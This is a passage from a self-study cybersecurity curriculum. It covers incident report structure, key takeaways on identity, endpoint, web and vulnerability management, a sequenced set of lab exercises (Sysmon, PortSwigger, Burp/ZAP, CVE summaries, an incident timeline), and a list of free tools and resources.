The final piece is the written report, and it is worth being direct about its importance: **a finding nobody can act on is not a finding.** Technical skill that cannot be communicated does not translate into organisational value, which is why Phase 1 said that attackers do not write reports and professionals do.

A usable incident report structure:

- **Summary** — what happened, in plain language, for someone who will read only this paragraph.
- **Timeline** — the evidence table above.
- **Impact** — what was affected, what data, how many systems, what is the business consequence.
- **Root cause** — the actual weakness, not just the mechanism. "A user clicked a link" is not a root cause; "credential phishing succeeded because MFA was not enforced on this account" is.
- **Actions taken** — containment, eradication, recovery, with times.
- **Recommendations** — specific, prioritised, and owned by someone. Not "improve security" but "enforce MFA on all accounts by [date], owner [team], addressing the gap that allowed this."

The distinction between a mechanism and a root cause in that list is worth re-reading, because it is the difference between a report that gets a control fixed and one that gets filed. And the GRC connection is direct: recommendations become risk register entries, and the controls that address them map to CIS or NIST — which is the phase's final deliverable, the five-risk control-mapping table.

### Key takeaways

- **The exit criterion is a three-part question**: which logs, which controls, which response steps. Answering all three about one incident is the skill this phase builds.
- **The most dangerous authentication event is a successful login.** Failed logins are usually noise; a successful login that does not fit the baseline is the signal.
- **MFA is not binary.** FIDO2 hardware keys, authenticator apps with number matching, push, and SMS are progressively weaker — and real-time phishing proxies and session token theft defeat some entirely.
- **SSO centralises authentication, which is both its strength and its risk.** One place to enforce and revoke; one place to compromise becomes everywhere.
- **AV matches signatures; EDR detects behaviour.** Only behavioural telemetry catches what has never been seen before, and only telemetry lets you reconstruct an incident afterwards.
- **4688 is not on by default.** The absence of an event may mean nobody enabled the logging — a lesson about detection in general.
- **Parent-child process relationships are where endpoint detection lives.** A document spawning a shell is the canonical pattern; check full paths, because masquerading relies on filenames.
- **Persistence is a finite, enumerable list** — Run keys, scheduled tasks, services, cron, systemd, `authorized_keys`. Find one mechanism and assume there are others.
- **Default-deny beats default-allow**; a forgotten rule then fails safely. Stale rules are the most common real firewall finding.
- **IDS alerts, IPS blocks — and the difference is the false-positive cost.** Blocking before you understand your noise causes outages.
- **Injection is one bug in different interpreters.** SQL injection and XSS are both "data escaped into code", and the fix is separation (parameterised queries, output encoding), never blocklists.
- **Access control bugs come from trusting the client.** IDOR and forced browsing exist because developers assumed nobody would change the number in the URL. The UI is not a control.
- **CVSS tells you severity, EPSS tells you likelihood, KEV tells you what is actually being exploited.** Prioritise on risk, not on score alone — a CVSS 9.8 in software you do not run is not urgent.
- **You cannot patch what you cannot list.** Asset inventory is the unglamorous prerequisite for everything in vulnerability management.
- **Remediation fixes the cause; mitigation reduces the risk.** Mitigation is a holding action and needs a review date, or it becomes permanent by accident.
- **Containment and investigation are in tension.** Isolate network access rather than powering off, or you destroy the volatile evidence — and "just reboot it" is the worst instinct in incident response.
- **Collect in order of volatility**, memory before disk, because RAM holds what fileless malware leaves behind and nothing else does.
- **Reports turn findings into fixes.** Mechanisms are not root causes, and a recommendation without an owner and a date is a wish.

### Practice this next

The seven tasks build on each other, and the ordering below is deliberate:

1. **Start with Sysmon and the event generation (tasks 1–3) as one continuous exercise.** Install Sysmon, then deliberately create the events: open PowerShell, create a file, fail a login, install and uninstall something harmless. Then go find each one in Event Viewer. The value is in the *hunting*, not the installing — you are learning what normal looks like, which is the prerequisite for noticing what is not. Look specifically for event 4688 process creation and check whether you had to enable auditing first.
2. **Do the PortSwigger labs next (task 4), spread across the phase.** Five Apprentice labs, one at a time, each written up as: the vulnerability, how I found it, the payload, and what the fix would be. Then, because of your web background, write the vulnerable code and the fixed version for one of them. This is your strongest differentiator — do not rush it.
3. **Use Burp Community or ZAP to intercept your own traffic (task 5)** while the labs are fresh. Watching a request you can edit is what turns "the app checks permissions" from a claim into something you have verified by changing a value and watching it fail.
4. **Then the CVE summaries (task 6)**, drawn from CISA's KEV catalog as the task specifies. For each of the five, record: affected product, CVSS score, whether it is in KEV, EPSS if available, what the impact is, and the fix — plus how you would *verify* the fix. Include the prioritisation reasoning from Part 5: if you had fifty CVEs and could fix five, why these?
5. **Write the incident timeline last (task 7)**, once Parts 1–4 have given you the log sources. Build the table as in the worked example, and add a column naming which control would have broken the chain at each step. Then write the short report around it, and pay attention to the root-cause line — it should name a control gap, not a user action.
6. **Finish with the control-mapping table** from the deliverable: five risks mapped to CIS or NIST controls. This is your first real GRC-flavoured artifact, and if the writing came easily, that is useful information for your Phase 5 specialisation choice.
7. **Read your own output end to end and check it against the exit criterion**: can you explain a phishing or web login abuse attack and name the logs, controls, and response steps? If the timeline and report do that convincingly, Phase 4's labs will make sense — and you will arrive at the specialisation choice in Phase 5 with evidence about which of the six areas you actually enjoyed.

## Tools for This Phase

| Tool | What it does | Cost | Official link | Mini-task | Free alternative |
|---|---|---|---|---|---|
| Windows Event Viewer | View Windows logs | Free | https://learn.microsoft.com/windows | Find login-related events | PowerShell log commands |
| Sysmon | Adds detailed Windows telemetry | Free | https://learn.microsoft.com/sysinternals/downloads/sysmon | Install in lab and view process events | Windows Security logs only |
| Wazuh | SIEM/XDR/log analysis | Free/open-source | https://wazuh.com/ | Read install docs and plan lab | Elastic/Splunk free tier |
| Greenbone Community Edition | Vulnerability scanning | Free/open-source | https://greenbone.github.io/docs/latest/ | Study scanner workflow; optional local scan | Nmap scripts |
| OWASP ZAP | Web app security testing | Free/open-source | https://www.zaproxy.org/ | Passive scan a local/test app | Burp Suite Community |
| Burp Suite Community | Web proxy | Free/community | https://portswigger.net/burp/communitydownload | Intercept a PortSwigger lab request | OWASP ZAP |
| CIS Controls | Security controls framework | Free | https://www.cisecurity.org/controls | Map 5 controls to home lab | NIST CSF |

## Free/cheap resources

- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy — https://portswigger.net/web-security
- MITRE ATT&CK — https://attack.mitre.org/
- Wazuh documentation — https://documentation.wazuh.com/
- CIS Controls — https://www.cisecurity.org/controls
- Microsoft security documentation — https://learn.microsoft.com/en-us/security/
- CISA known exploited vulnerabilities catalog — https://www.cisa.gov/known-exploited-vulnerabilities-catalog

## Hands-on practice tasks

1. Install Sysmon on a Windows VM or your own lab machine if safe.
2. Generate a few safe events: open PowerShell, create a file, fail a login, install/uninstall a harmless app.
3. Find related logs in Event Viewer.
4. Complete 5 PortSwigger Apprentice-level labs.
5. Use Burp Community or OWASP ZAP to intercept your own browser traffic to a training lab.
6. Pick 5 CVEs from CISA KEV and summarize affected product, impact, and fix.
7. Write a mock incident timeline for a phishing login.

## Deliverable / proof of work

Create `portfolio/cyber/03-security-fundamentals.md` with:

- Event Viewer/Sysmon screenshots
- 5 PortSwigger lab notes
- 5 CVE summaries
- One mock incident timeline
- Table mapping 5 risks to CIS or NIST controls

## Checklist

- [ ] I understand identity security basics. <!-- id: cyber-03-c01 energy: low -->
- [ ] I understand endpoint security basics. <!-- id: cyber-03-c02 energy: low -->
- [ ] I understand network security basics. <!-- id: cyber-03-c03 energy: low -->
- [ ] I understand OWASP Top 10 at a basic level. <!-- id: cyber-03-c04 energy: low -->
- [ ] I completed 5 PortSwigger labs. <!-- id: cyber-03-c05 energy: normal -->
- [ ] I inspected Windows security/process logs. <!-- id: cyber-03-c06 energy: normal -->
- [ ] I summarized 5 CVEs. <!-- id: cyber-03-c07 energy: normal -->
- [ ] I wrote a mock incident timeline. <!-- id: cyber-03-c08 energy: normal -->

## You're ready to move on when...

You can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved.

## Free vs Paid

### What's free and enough

Event Viewer, Sysmon, Wazuh docs, PortSwigger Academy, Burp Community, OWASP ZAP, MITRE, CIS, and NIST are enough.

### What's paid and why you'd upgrade

Burp Suite Professional, commercial SIEMs, and paid vulnerability scanners add speed, automation, and enterprise features.

### When it's worth paying

Not in this phase. Burp Community and free labs are enough.
